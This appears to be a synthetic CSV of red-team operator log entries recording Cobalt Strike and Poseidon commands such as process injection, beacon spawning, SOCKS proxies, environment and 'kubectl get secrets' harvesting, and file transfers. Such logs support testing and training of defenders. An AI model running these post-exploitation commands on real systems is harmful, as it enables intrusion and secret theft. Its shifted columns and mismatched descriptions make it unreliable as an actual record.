entry_identifier,start_date,end_date,source_ip,dest_ip,tool,user_context,command,description,output,comments,operator_name,extra_fields,oplog_id,tags
2025,2024-03-12 01:29:28,2024-03-22 02:34:06,90.201.27.188,66.1.255.186,Cobalt Strike,afranklin@harrison.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Jerry Gonzalez,,,
2026,2024-03-10 04:33:38,2024-04-25 02:11:01,148.64.118.11,149.55.234.226,Cobalt Strike,ipena@lane.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Manuel Chase,,,
2027,2023-08-31 12:22:45,2024-04-02 11:34:10,35.14.5.27,66.1.255.186,OST,ipena@lane.com,sleep 3,PID: 8087,Success,Sleeping a beacon,Manuel Chase,,,
2028,2023-09-10 21:08:30,2024-03-07 02:36:39,116.163.112.137,66.1.255.186,Cobalt Strike,alopez@dawson.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Manuel Chase,,,
2029,2024-04-22 06:26:01,2024-05-10 18:41:12,90.201.27.188,149.55.234.226,OST,ipena@lane.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Manuel Chase,,,
2030,2023-10-12 13:00:41,2024-02-28 16:29:38,148.64.118.11,66.1.255.186,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Jerry Gonzalez,,,
2031,2023-09-24 13:39:39,2023-11-29 14:02:00,35.14.5.27,55.167.201.151,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Failed,Downloading a file,Manuel Chase,,,
2032,2024-02-06 12:33:40,2024-02-24 19:06:07,116.163.112.137,66.1.255.186,Cobalt Strike,afranklin@harrison.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Manuel Chase,,,
2033,2023-07-29 21:24:40,2023-07-30 18:08:15,148.64.118.11,149.55.234.226,Poseidon,alopez@dawson.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Alexander Kim,,,
2034,2024-04-14 13:17:50,2024-04-20 13:06:29,116.163.112.137,55.167.201.151,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Manuel Chase,,,
2035,2023-11-22 20:14:35,2024-03-27 06:42:37,148.64.118.11,149.55.234.226,Poseidon,alopez@dawson.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Jerry Gonzalez,,,
2036,2023-08-27 03:15:01,2024-02-19 13:48:47,148.64.118.11,149.55.234.226,OST,ipena@lane.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Alexander Kim,,,
2037,2024-06-21 15:40:10,2024-06-21 15:40:10.582676,35.14.5.27,66.1.255.186,OST,ipena@lane.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Jerry Gonzalez,,,
2038,2023-09-20 11:49:21,2023-09-25 17:45:19,148.64.118.11,149.55.234.226,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Jerry Gonzalez,,,
2039,2023-09-10 02:00:49,2024-03-03 09:51:49,116.163.112.137,149.55.234.226,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Jerry Gonzalez,,,
2040,2023-12-23 17:08:57,2024-02-02 23:17:16,116.163.112.137,66.1.255.186,OST,ipena@lane.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Jerry Gonzalez,,,
2041,2023-10-23 10:28:43,2024-03-06 05:11:54,116.163.112.137,66.1.255.186,Poseidon,afranklin@harrison.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Jerry Gonzalez,,,
2042,2024-05-11 13:42:38,2024-05-11 13:42:38.642622,116.163.112.137,55.167.201.151,OST,afranklin@harrison.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Failed,Using BBOT safe and passive modules,Jerry Gonzalez,,,
2043,2024-02-29 03:13:05,2024-04-22 06:53:11,116.163.112.137,149.55.234.226,OST,ipena@lane.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Manuel Chase,,,
2044,2024-06-17 11:07:12,2024-06-17 11:07:12.701441,116.163.112.137,55.167.201.151,Cobalt Strike,alopez@dawson.com,sleep 7,PID 3213,Success,Sleeping a beacon,Manuel Chase,,,
2045,2024-03-23 10:05:32,2024-03-24 08:28:50,35.14.5.27,55.167.201.151,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Success,Conducting container discovery,Manuel Chase,,,
2046,2024-03-23 17:36:35,2024-04-09 08:43:57,116.163.112.137,55.167.201.151,Cobalt Strike,ipena@lane.com,sleep 7,PID 3213,Success,Sleeping a beacon,Manuel Chase,,,
2047,2024-04-12 10:23:35,2024-04-21 15:29:03,35.14.5.27,66.1.255.186,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Jerry Gonzalez,,,
2048,2023-11-30 18:57:24,2024-03-06 06:36:41,35.14.5.27,55.167.201.151,Cobalt Strike,alopez@dawson.com,pwd,PID 18794,Failed,Obtaining current working directory,Jerry Gonzalez,,,
2049,2024-06-09 06:45:38,2024-06-09 06:45:38.271952,35.14.5.27,149.55.234.226,Cobalt Strike,alopez@dawson.com,pwd,PID 18794,Failed,Obtaining current working directory,Manuel Chase,,,
2050,2024-06-28 01:55:44,2024-06-28 01:55:44.243393,90.201.27.188,149.55.234.226,Cobalt Strike,afranklin@harrison.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Manuel Chase,,,
2051,2023-08-05 09:40:31,2024-04-25 19:23:58,148.64.118.11,149.55.234.226,OST,ipena@lane.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Jerry Gonzalez,,,
2052,2024-03-19 04:27:06,2024-04-01 07:12:20,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Manuel Chase,,,
2053,2023-08-04 13:08:54,2023-10-19 02:53:59,90.201.27.188,55.167.201.151,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Manuel Chase,,,
2054,2024-03-13 05:25:43,2024-05-01 10:41:19,116.163.112.137,55.167.201.151,OST,alopez@dawson.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Failed,Using BBOT safe and passive modules,Alexander Kim,,,
2055,2024-01-20 17:09:07,2024-03-16 23:26:17,116.163.112.137,149.55.234.226,Poseidon,ipena@lane.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Jerry Gonzalez,,,
2056,2024-05-11 06:39:25,2024-05-11 06:39:25.880179,35.14.5.27,55.167.201.151,Poseidon,afranklin@harrison.com,pty curl,"PID 5852, Callback 25",Success,Attempting to use cURL,Manuel Chase,,,
2057,2024-01-19 17:24:48,2024-03-24 05:13:27,90.201.27.188,55.167.201.151,Poseidon,ipena@lane.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Jerry Gonzalez,,,
2058,2024-01-14 22:15:44,2024-02-15 20:49:02,35.14.5.27,149.55.234.226,Poseidon,afranklin@harrison.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Alexander Kim,,,
2059,2023-12-23 17:07:22,2024-02-12 12:16:14,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Alexander Kim,,,
2060,2023-09-22 10:45:23,2023-12-31 14:06:37,35.14.5.27,149.55.234.226,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Alexander Kim,,,
2061,2023-12-15 07:42:04,2024-05-02 01:33:01,148.64.118.11,55.167.201.151,OST,afranklin@harrison.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Alexander Kim,,,
2062,2024-01-28 14:54:33,2024-03-16 22:43:24,35.14.5.27,66.1.255.186,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Success,Conducting container discovery,Alexander Kim,,,
2063,2024-04-13 10:36:06,2024-04-17 05:59:33,116.163.112.137,66.1.255.186,Cobalt Strike,alopez@dawson.com,inject-assembly 10023 /during/window.exe,PID 29523,Failed,Injecting assembly into a process,Manuel Chase,,,
2064,2023-10-26 10:03:55,2024-05-01 00:36:39,90.201.27.188,55.167.201.151,Cobalt Strike,afranklin@harrison.com,sleep 7,PID 3213,Failed,Sleeping a beacon,Alexander Kim,,,
2065,2023-12-28 13:18:13,2024-04-01 07:58:49,35.14.5.27,55.167.201.151,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Manuel Chase,,,
2066,2024-05-26 13:16:58,2024-05-26 13:16:58.230518,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Manuel Chase,,,
2067,2024-03-15 08:15:06,2024-04-22 03:15:45,148.64.118.11,66.1.255.186,Cobalt Strike,alopez@dawson.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Alexander Kim,,,
2068,2024-02-16 14:51:52,2024-05-08 04:11:09,148.64.118.11,66.1.255.186,Cobalt Strike,afranklin@harrison.com,sleep 7,PID 3213,Success,Sleeping a beacon,Manuel Chase,,,
2069,2024-04-21 09:52:50,2024-04-27 00:12:20,90.201.27.188,149.55.234.226,OST,afranklin@harrison.com,ls,PID: 13028,Failed,Listing files and directories,Alexander Kim,,,
2070,2023-09-10 17:52:07,2024-01-27 18:21:27,116.163.112.137,149.55.234.226,OST,afranklin@harrison.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Jerry Gonzalez,,,
2071,2024-01-11 14:07:55,2024-03-13 17:05:45,90.201.27.188,55.167.201.151,Cobalt Strike,ipena@lane.com,pwd,PID 18794,Failed,Obtaining current working directory,Jerry Gonzalez,,,
2072,2023-12-25 19:36:19,2024-04-14 08:17:59,35.14.5.27,55.167.201.151,Poseidon,alopez@dawson.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Manuel Chase,,,
2073,2023-07-24 13:35:56,2023-09-06 17:21:16,90.201.27.188,55.167.201.151,Poseidon,alopez@dawson.com,pty curl,"PID 5852, Callback 25",Success,Attempting to use cURL,Manuel Chase,,,
2074,2023-08-15 04:58:36,2024-03-13 17:25:52,148.64.118.11,149.55.234.226,Cobalt Strike,ipena@lane.com,spawn x64 HTTPS,PID 2061,Failed,Spawning a new beacon,Alexander Kim,,,
2075,2023-10-24 01:35:48,2023-10-24 03:21:18,35.14.5.27,66.1.255.186,OST,afranklin@harrison.com,ls,PID: 13028,Failed,Listing files and directories,Jerry Gonzalez,,,
2076,2023-11-21 12:13:39,2024-04-20 11:23:14,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Jerry Gonzalez,,,
2077,2024-01-22 21:06:31,2024-04-16 08:12:15,148.64.118.11,55.167.201.151,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Alexander Kim,,,
2078,2023-12-15 23:58:19,2024-02-12 08:28:19,35.14.5.27,66.1.255.186,Poseidon,ipena@lane.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Manuel Chase,,,
2079,2023-12-12 12:06:56,2024-02-24 06:27:12,90.201.27.188,149.55.234.226,Poseidon,alopez@dawson.com,getenv,"PID 18369, Callback 13",Success,Attempting to get environment variables,Alexander Kim,,,
2080,2024-02-29 22:29:39,2024-04-05 21:35:08,116.163.112.137,55.167.201.151,Cobalt Strike,alopez@dawson.com,shinject 12473 x64 /growth.bin,PID 31000,Success,Attempting process injection,Alexander Kim,,,
2081,2024-01-11 16:43:23,2024-02-16 13:52:53,90.201.27.188,149.55.234.226,Cobalt Strike,ipena@lane.com,inject-assembly 10023 /during/window.exe,PID 29523,Success,Injecting assembly into a process,Jerry Gonzalez,,,
2082,2024-06-23 23:03:37,2024-06-23 23:03:37.028417,90.201.27.188,55.167.201.151,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Manuel Chase,,,
2083,2024-02-09 12:39:30,2024-03-01 21:28:14,116.163.112.137,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl get namespaces -n cluster,"PID 29432, Callback 20",Success,Conducting container discovery,Manuel Chase,,,
2084,2024-04-09 14:10:30,2024-05-02 10:43:47,35.14.5.27,66.1.255.186,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Success,Conducting container discovery,Jerry Gonzalez,,,
2085,2023-09-25 17:24:05,2024-03-28 07:52:52,90.201.27.188,149.55.234.226,Cobalt Strike,ipena@lane.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Jerry Gonzalez,,,
2086,2023-12-04 11:39:12,2024-04-27 19:59:51,90.201.27.188,149.55.234.226,OST,ipena@lane.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Manuel Chase,,,
2087,2023-07-23 02:53:17,2023-09-15 11:32:21,116.163.112.137,55.167.201.151,OST,afranklin@harrison.com,ls,PID: 13028,Success,Listing files and directories,Alexander Kim,,,
2088,2023-08-19 11:03:33,2024-04-27 17:56:28,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Alexander Kim,,,
2089,2023-09-05 11:40:57,2024-02-11 05:52:20,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Success,Conducting container discovery,Jerry Gonzalez,,,
2090,2023-09-17 21:12:56,2023-11-08 20:01:37,35.14.5.27,55.167.201.151,Cobalt Strike,ipena@lane.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Manuel Chase,,,
2091,2024-03-09 10:13:05,2024-03-21 12:50:03,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Jerry Gonzalez,,,
2092,2024-03-15 07:46:58,2024-05-05 13:43:01,35.14.5.27,66.1.255.186,Cobalt Strike,alopez@dawson.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Manuel Chase,,,
2093,2024-05-04 05:21:27,2024-05-07 13:08:15,148.64.118.11,149.55.234.226,Cobalt Strike,ipena@lane.com,pwd,PID 18794,Success,Obtaining current working directory,Alexander Kim,,,
2094,2023-08-20 21:42:13,2024-01-11 13:38:26,90.201.27.188,55.167.201.151,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Failed,Downloading a file,Alexander Kim,,,
2095,2023-10-30 21:08:25,2023-11-03 14:08:15,90.201.27.188,149.55.234.226,Poseidon,alopez@dawson.com,pty curl,"PID 5852, Callback 25",Success,Attempting to use cURL,Alexander Kim,,,
2096,2024-02-12 07:09:06,2024-04-06 13:49:15,35.14.5.27,149.55.234.226,OST,afranklin@harrison.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Failed,Using BBOT safe and passive modules,Manuel Chase,,,
2097,2024-02-17 09:01:30,2024-04-12 04:48:33,116.163.112.137,149.55.234.226,OST,afranklin@harrison.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Failed,Using BBOT safe and passive modules,Alexander Kim,,,
2098,2023-12-22 19:10:06,2024-01-01 13:36:14,116.163.112.137,66.1.255.186,OST,ipena@lane.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Jerry Gonzalez,,,
2099,2023-08-23 04:53:31,2023-10-11 03:14:19,148.64.118.11,55.167.201.151,Poseidon,alopez@dawson.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Jerry Gonzalez,,,
2100,2023-10-10 18:51:56,2024-02-23 13:43:54,116.163.112.137,66.1.255.186,Poseidon,alopez@dawson.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Jerry Gonzalez,,,
2101,2023-12-25 08:00:27,2024-05-08 02:38:47,148.64.118.11,66.1.255.186,Cobalt Strike,alopez@dawson.com,sleep 7,PID 3213,Failed,Sleeping a beacon,Jerry Gonzalez,,,
2102,2024-01-04 08:57:25,2024-03-30 03:49:16,35.14.5.27,55.167.201.151,OST,ipena@lane.com,ls,PID: 13028,Success,Listing files and directories,Manuel Chase,,,
2103,2024-03-31 00:49:35,2024-04-25 08:07:40,148.64.118.11,55.167.201.151,Cobalt Strike,ipena@lane.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Jerry Gonzalez,,,
2104,2023-10-26 03:02:17,2024-05-10 02:09:22,116.163.112.137,149.55.234.226,OST,alopez@dawson.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Failed,Using BBOT safe and passive modules,Alexander Kim,,,
2105,2023-12-28 13:26:32,2024-05-02 12:23:57,35.14.5.27,149.55.234.226,OST,ipena@lane.com,ls,PID: 13028,Failed,Listing files and directories,Jerry Gonzalez,,,
2106,2024-05-14 14:24:12,2024-05-14 14:24:12.537527,116.163.112.137,55.167.201.151,Cobalt Strike,ipena@lane.com,cd /policy/fear/yourself,PID 14828,Success,Navigating to a directory,Jerry Gonzalez,,,
2107,2023-12-26 16:40:49,2023-12-27 11:11:57,148.64.118.11,149.55.234.226,Poseidon,afranklin@harrison.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Success,Attempting to start a SOCKS proxy,Alexander Kim,,,
2108,2023-09-09 18:44:09,2023-12-24 11:17:34,35.14.5.27,66.1.255.186,Cobalt Strike,ipena@lane.com,sleep 7,PID 3213,Success,Sleeping a beacon,Alexander Kim,,,
2109,2023-09-24 12:14:18,2023-11-24 09:37:55,148.64.118.11,66.1.255.186,Cobalt Strike,ipena@lane.com,pwd,PID 18794,Failed,Obtaining current working directory,Jerry Gonzalez,,,
2110,2024-04-22 09:38:16,2024-05-03 13:21:25,35.14.5.27,149.55.234.226,OST,ipena@lane.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Alexander Kim,,,
2111,2023-10-19 03:43:33,2023-12-30 13:15:38,35.14.5.27,66.1.255.186,Poseidon,afranklin@harrison.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Alexander Kim,,,
2112,2024-06-27 10:45:17,2024-06-27 10:45:17.484508,116.163.112.137,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Jerry Gonzalez,,,
2113,2023-07-29 17:47:08,2024-02-10 11:44:52,90.201.27.188,55.167.201.151,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Manuel Chase,,,
2114,2023-09-28 15:49:23,2024-05-08 17:47:35,35.14.5.27,66.1.255.186,Poseidon,afranklin@harrison.com,pty ./kubectl get pods,"PID 2804, Callback 6",Failed,Conducting container discovery,Jerry Gonzalez,,,
2115,2024-02-14 22:50:43,2024-04-01 11:19:43,90.201.27.188,149.55.234.226,Cobalt Strike,afranklin@harrison.com,inject-assembly 10023 /during/window.exe,PID 29523,Failed,Injecting assembly into a process,Jerry Gonzalez,,,
2116,2024-03-11 00:16:37,2024-04-24 16:27:12,116.163.112.137,149.55.234.226,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Success,Conducting container discovery,Manuel Chase,,,
2117,2023-12-07 17:22:02,2024-02-08 02:03:14,35.14.5.27,55.167.201.151,Cobalt Strike,ipena@lane.com,spawn x64 HTTPS,PID 2061,Success,Spawning a new beacon,Manuel Chase,,,
2118,2024-04-14 01:27:11,2024-04-28 14:43:38,90.201.27.188,149.55.234.226,Poseidon,afranklin@harrison.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Alexander Kim,,,
2119,2023-12-17 00:13:32,2024-01-19 11:33:01,35.14.5.27,55.167.201.151,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Alexander Kim,,,
2120,2023-08-20 18:11:59,2024-01-06 23:29:55,35.14.5.27,55.167.201.151,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Manuel Chase,,,
2121,2024-03-31 03:26:42,2024-04-30 01:25:01,90.201.27.188,149.55.234.226,Cobalt Strike,afranklin@harrison.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Manuel Chase,,,
2122,2023-08-14 03:52:18,2023-08-22 13:38:23,35.14.5.27,149.55.234.226,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Jerry Gonzalez,,,
2123,2023-11-14 17:21:58,2024-03-06 13:29:33,90.201.27.188,149.55.234.226,OST,ipena@lane.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Manuel Chase,,,
2124,2024-07-02 07:49:36,2024-07-02 07:49:36.114376,116.163.112.137,55.167.201.151,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Manuel Chase,,,
2125,2024-06-07 17:44:07,2024-06-07 17:44:07.754153,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Jerry Gonzalez,,,
2126,2023-11-19 10:50:57,2024-02-10 16:46:36,90.201.27.188,66.1.255.186,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Alexander Kim,,,
2127,2024-04-01 07:46:46,2024-04-09 17:48:58,90.201.27.188,149.55.234.226,Cobalt Strike,afranklin@harrison.com,cd /policy/fear/yourself,PID 14828,Success,Navigating to a directory,Manuel Chase,,,
2128,2024-02-12 18:24:18,2024-04-20 17:14:59,116.163.112.137,66.1.255.186,Poseidon,alopez@dawson.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Manuel Chase,,,
2129,2023-12-03 06:38:03,2024-04-04 15:22:25,35.14.5.27,149.55.234.226,Cobalt Strike,afranklin@harrison.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Manuel Chase,,,
2130,2024-02-01 14:20:44,2024-02-15 18:23:28,35.14.5.27,55.167.201.151,Cobalt Strike,alopez@dawson.com,inject-assembly 10023 /during/window.exe,PID 29523,Success,Injecting assembly into a process,Manuel Chase,,,
2131,2024-04-06 09:19:09,2024-04-13 15:51:40,90.201.27.188,66.1.255.186,Cobalt Strike,alopez@dawson.com,sleep 7,PID 3213,Failed,Sleeping a beacon,Jerry Gonzalez,,,
2132,2023-11-19 00:22:13,2024-05-06 16:53:23,116.163.112.137,55.167.201.151,Cobalt Strike,afranklin@harrison.com,sleep 7,PID 3213,Failed,Sleeping a beacon,Alexander Kim,,,
2133,2023-07-15 12:34:04,2024-01-01 03:30:46,116.163.112.137,66.1.255.186,OST,afranklin@harrison.com,sleep 3,PID: 8087,Success,Sleeping a beacon,Alexander Kim,,,
2134,2023-10-24 02:26:52,2023-11-10 05:30:52,116.163.112.137,66.1.255.186,OST,alopez@dawson.com,ls,PID: 13028,Failed,Listing files and directories,Jerry Gonzalez,,,
2135,2023-12-17 06:50:56,2024-01-18 04:51:31,90.201.27.188,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Jerry Gonzalez,,,
2136,2024-03-18 20:18:30,2024-04-17 19:20:03,116.163.112.137,55.167.201.151,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Failed,Conducting container discovery,Jerry Gonzalez,,,
2137,2023-10-21 07:50:30,2024-04-25 19:18:16,90.201.27.188,66.1.255.186,Poseidon,alopez@dawson.com,pty kubectl get namespaces,"PID 4839, Callback 49",Success,Conducting container discovery,Manuel Chase,,,
2138,2023-12-03 20:25:43,2024-04-01 04:28:18,35.14.5.27,149.55.234.226,OST,alopez@dawson.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Jerry Gonzalez,,,
2139,2024-03-12 06:15:49,2024-04-09 15:54:49,35.14.5.27,55.167.201.151,Cobalt Strike,ipena@lane.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Manuel Chase,,,
2140,2023-10-22 13:13:02,2023-11-18 11:11:15,116.163.112.137,149.55.234.226,Cobalt Strike,afranklin@harrison.com,cd /policy/fear/yourself,PID 14828,Success,Navigating to a directory,Manuel Chase,,,
2141,2024-04-10 20:04:52,2024-05-10 01:53:26,90.201.27.188,149.55.234.226,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Manuel Chase,,,
2142,2023-11-22 06:01:53,2023-12-10 07:49:24,90.201.27.188,66.1.255.186,Poseidon,alopez@dawson.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Alexander Kim,,,
2143,2023-09-28 10:31:46,2024-02-13 02:31:31,90.201.27.188,55.167.201.151,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Jerry Gonzalez,,,
2144,2024-05-13 22:04:39,2024-05-13 22:04:39.056007,148.64.118.11,55.167.201.151,Poseidon,alopez@dawson.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Jerry Gonzalez,,,
2145,2024-01-10 05:06:04,2024-04-24 08:33:38,116.163.112.137,66.1.255.186,Cobalt Strike,alopez@dawson.com,pwd,PID 18794,Success,Obtaining current working directory,Manuel Chase,,,
2146,2023-09-10 10:45:58,2023-11-24 04:49:08,148.64.118.11,66.1.255.186,Cobalt Strike,afranklin@harrison.com,spawn x64 HTTPS,PID 2061,Success,Spawning a new beacon,Alexander Kim,,,
2147,2023-09-18 19:24:51,2023-11-01 23:36:13,116.163.112.137,66.1.255.186,Poseidon,alopez@dawson.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Manuel Chase,,,
2148,2023-11-05 22:01:56,2024-03-16 10:37:33,116.163.112.137,55.167.201.151,Cobalt Strike,ipena@lane.com,sleep 7,PID 3213,Success,Sleeping a beacon,Alexander Kim,,,
2149,2023-07-25 10:44:39,2023-10-30 07:49:13,148.64.118.11,55.167.201.151,Poseidon,ipena@lane.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Jerry Gonzalez,,,
2150,2023-10-14 08:09:27,2024-01-15 08:51:06,148.64.118.11,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Alexander Kim,,,
2151,2023-07-26 22:46:17,2024-01-28 20:00:36,90.201.27.188,66.1.255.186,Poseidon,alopez@dawson.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Alexander Kim,,,
2152,2024-03-10 03:12:00,2024-03-15 12:40:21,148.64.118.11,55.167.201.151,Poseidon,alopez@dawson.com,pty whoami,"PID 31096, Callback 44",Failed,Obtaining user context,Jerry Gonzalez,,,
